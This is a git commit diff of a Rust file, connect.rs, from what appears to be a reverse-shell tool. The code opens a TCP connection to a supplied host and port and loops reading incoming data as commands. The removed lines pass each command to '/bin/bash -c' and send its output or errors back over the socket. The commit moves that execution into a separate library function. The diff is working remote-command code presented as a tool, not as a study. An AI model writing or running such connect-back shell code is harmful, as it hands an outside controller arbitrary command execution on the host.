a19b4bf5ed2dd0db0f0b155ee68e942975579b96
godfriedt <60560876+godfriedt@users.noreply.github.com>
2024-05-20 13:26:42 -0500

    Update connect.rs

--- src/connect.rs
+++ src/connect.rs
@@ -1,7 +1,7 @@
 use std::net::TcpStream;
-use std::io::{Read, Write};
-use std::str;
-use std::process::{Command, Output};
+use std::io::Read;
+
+use crate::library::handle_command_and_write;
 
 pub fn socket_connect(addr: &String, port: &String) {
 
@@ -9,52 +9,13 @@ pub fn socket_connect(addr: &String, port: &String) {
     let mut connection = TcpStream::connect(format!("{addr}:{port}")).unwrap();
 
     loop {
-        // read
+        // read from tcp stream
         let mut read_buf= [0u8; 1024];
         let bytes_read = connection.read(&mut read_buf).unwrap();
         let data = &read_buf[..bytes_read];
 
-        // execute command
-        if (data.len() == 1) && data[0] == 0 {
-            connection.write("\0".as_bytes()).unwrap();
-            connection.flush().unwrap();
-        } else {
-            let command = shell_execute_command(data);
-
-            if command.status.success() == true { // ensure command success
-                let raw = command.stdout;
-                let output = str::from_utf8(&raw).unwrap();
-        
-                if output.len() > 0 {
-                    connection.write(output.as_bytes()).unwrap();
-                    connection.flush().unwrap();
-                } else {
-                    connection.write("\0".as_bytes()).unwrap();
-                    connection.flush().unwrap();
-                }
-            } else { // catch command error
-                let raw = command.stderr;
-                let output = str::from_utf8(&raw).unwrap();
-        
-                if output.len() > 0 {
-                    connection.write(output.as_bytes()).unwrap();
-                    connection.flush().unwrap();
-                } else {
-                    connection.write("[UNKNOWN ERROR]".as_bytes()).unwrap();
-                    connection.flush().unwrap();
-                }
-            }
-        }
+        // execute command and write to tcp stream
+        handle_command_and_write(data, &mut connection);
         
     }
-}
-
-fn shell_execute_command(data: &[u8]) -> Output {
-    let command = Command::new("/bin/bash")
-        .arg("-c")
-        .arg(str::from_utf8(&data).unwrap())
-        .output()
-        .unwrap();
-
-    return command;
 }
